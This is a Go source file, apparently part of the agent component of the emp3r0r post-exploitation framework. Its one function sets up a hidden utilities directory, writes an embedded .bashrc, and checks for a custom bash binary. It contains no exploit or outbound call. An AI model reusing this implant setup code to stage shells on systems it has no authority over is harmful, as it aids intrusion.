//go:build linux
// +build linux

package agent

import (
	"fmt"
	"log"
	"os"

	"github.com/jm33-m0/emp3r0r/core/lib/file"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// ExtractBash extract embedded bash binary and configure our bash shell
func ExtractBash() error {
	if !util.IsExist(RuntimeConfig.UtilsPath) {
		err := os.MkdirAll(RuntimeConfig.UtilsPath, 0700)
		if err != nil {
			log.Fatalf("[-] Cannot mkdir %s: %v", RuntimeConfig.AgentRoot, err)
		}
	}

	err := os.WriteFile(RuntimeConfig.UtilsPath+"/.bashrc", []byte(file.BashRC), 0600)
	if err != nil {
		log.Printf("Write bashrc: %v", err)
	}

	// return ioutil.WriteFile(RuntimeConfig.UtilsPath+"/bash", bashData, 0755)
	customBash := RuntimeConfig.UtilsPath + "/bash"
	if !util.IsFileExist(customBash) {
		err = fmt.Errorf("Custom bash binary (%s) not found, maybe you need to run `vaccine`",
			customBash)
		log.Print(err)
	}
	return err
}
